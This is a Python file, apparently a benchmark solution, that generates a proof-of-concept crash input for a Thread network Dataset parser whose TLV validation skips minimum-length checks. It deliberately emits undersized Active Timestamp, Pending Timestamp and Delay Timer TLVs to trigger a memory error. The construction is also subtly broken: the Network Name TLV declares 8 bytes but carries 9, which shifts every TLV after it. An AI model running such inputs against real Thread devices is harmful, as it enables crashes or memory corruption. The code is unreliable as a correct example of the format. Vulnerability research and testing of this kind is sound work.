import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a dataset structure that will trigger the vulnerability
        # The vulnerability is in Dataset::IsTlvValid() where Active/Pending Timestamp
        # and Delay Timer TLVs are not validated for minimum required length
        
        # We'll create a dataset with invalid TLVs that have insufficient length
        # causing buffer overflow when parsed
        
        poc = bytearray()
        
        # Dataset structure based on Thread specification
        # TLV format: Type (1 byte) + Length (1 byte) + Value (variable)
        
        # Start with valid TLVs to set up context
        # Network Key TLV (Type 0x00)
        poc.extend(b'\x00\x10' + b'\x11' * 16)  # 16-byte network key
        
        # Network Name TLV (Type 0x01)
        poc.extend(b'\x01\x08' + b'ThreadNet')  # 8-byte network name
        
        # Extended PAN ID TLV (Type 0x02)
        poc.extend(b'\x02\x08' + b'\x22' * 8)  # 8-byte extended PAN ID
        
        # Mesh Local Prefix TLV (Type 0x03)
        poc.extend(b'\x03\x08' + b'\x33' * 8)  # 8-byte mesh local prefix
        
        # Channel TLV (Type 0x05)
        poc.extend(b'\x05\x01' + b'\x0b')  # 1-byte channel
        
        # PAN ID TLV (Type 0x04)
        poc.extend(b'\x04\x02' + b'\xde\xad')  # 2-byte PAN ID
        
        # PSKc TLV (Type 0x06)
        poc.extend(b'\x06\x10' + b'\x44' * 16)  # 16-byte PSKc
        
        # Security Policy TLV (Type 0x07)
        poc.extend(b'\x07\x04' + b'\x55' * 4)  # 4-byte security policy
        
        # Now add the vulnerable TLVs with insufficient length
        # These should have minimum length of 8 bytes (timestamp) and 4 bytes (delay timer)
        # but we'll provide less to trigger overflow
        
        # Active Timestamp TLV (Type 0x0A) - should be 8 bytes, but provide only 1
        poc.extend(b'\x0a\x01' + b'\x66')  # Only 1 byte instead of 8
        
        # Pending Timestamp TLV (Type 0x0B) - should be 8 bytes, but provide only 2
        poc.extend(b'\x0b\x02' + b'\x77\x77')  # Only 2 bytes instead of 8
        
        # Delay Timer TLV (Type 0x0C) - should be 4 bytes, but provide only 1
        poc.extend(b'\x0c\x01' + b'\x88')  # Only 1 byte instead of 4
        
        # Add padding to reach exactly 262 bytes (ground truth length)
        current_len = len(poc)
        if current_len < 262:
            poc.extend(b'\x00' * (262 - current_len))
        elif current_len > 262:
            poc = poc[:262]
        
        return bytes(poc)